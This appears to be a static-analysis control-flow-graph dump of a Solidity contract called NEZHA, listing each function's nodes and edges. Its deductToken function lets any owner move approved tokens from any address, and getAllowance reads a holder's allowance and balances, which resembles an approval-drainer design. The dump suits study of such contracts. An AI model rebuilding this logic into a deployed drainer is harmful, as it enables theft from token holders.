Contract: IERC20
==================================================


Contract: NEZHA
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: owners[msg.sender] = true

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: latestOwner = msg.sender

Edges:
  0 -> 1
  1 -> 2

Function: transferOwnerShip
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(newOwner != address(0),New owner is the zero address)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(! owners[newOwner],Already an owner)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: owners[newOwner] = true

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: latestOwner = newOwner

  ID: 5
  Type: NodeType.RETURN
  Expression: true

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 6
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  6 -> 1

Function: isContract
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: 

  ID: 2
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: size = extcodesize(uint256)(account)

  ID: 4
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 5
  Type: NodeType.RETURN
  Expression: size > 0

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5

Function: registerToken
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(isContract(token),Token is not a contract)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(token != address(0),Invalid token address)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: tokens[token] = IERC20(token)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 4
  1 -> 2
  2 -> 3
  4 -> 1

Function: deductToken
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(tokens[token] != IERC20(address(0)),Token not registered)

  ID: 2
  Type: NodeType.RETURN
  Expression: tokens[token].transferFrom(from,to,amount)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1

Function: getAllowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: erc20 = IERC20(token)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: allowance = erc20.allowance(ownerAddress,address(this))

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: contractBalance = erc20.balanceOf(ownerAddress)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: trxBalance = ownerAddress.balance

  ID: 5
  Type: NodeType.RETURN
  Expression: (allowance,contractBalance,trxBalance)

  ID: 6
  Type: NodeType.RETURN
  Expression: (allowance,contractBalance,trxBalance)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5

Function: getOwner
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: latestOwner

Edges:
  0 -> 1


